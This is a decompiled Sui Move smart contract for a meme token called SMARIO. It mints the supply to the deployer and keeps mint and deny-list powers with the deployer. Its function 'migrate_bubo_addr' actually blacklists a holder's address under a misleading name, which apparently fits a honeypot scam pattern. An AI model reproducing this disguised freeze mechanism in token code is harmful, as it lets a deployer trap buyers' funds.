module 0x45db29fd4049879a9047c73604099ddd4a6f0b41c940f1610cb106c022cdf84f::SMARIO {
    struct SMARIO has drop {
        dummy_field: bool,
    }

    fun init(arg0: SMARIO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SMARIO>(arg0, 6, b"SMARIO", b"Suiper Mario", b"Meme inspired by the classic game Super Mario Bros...", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2F1000024609_6994f0fb9d.jpg&w=640&q=75")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SMARIO>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<SMARIO>>(0x2::coin::mint<SMARIO>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SMARIO>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SMARIO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun migrate_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SMARIO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SMARIO>(arg0, arg1, arg2, arg3);
    }

    public entry fun remove_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SMARIO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SMARIO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

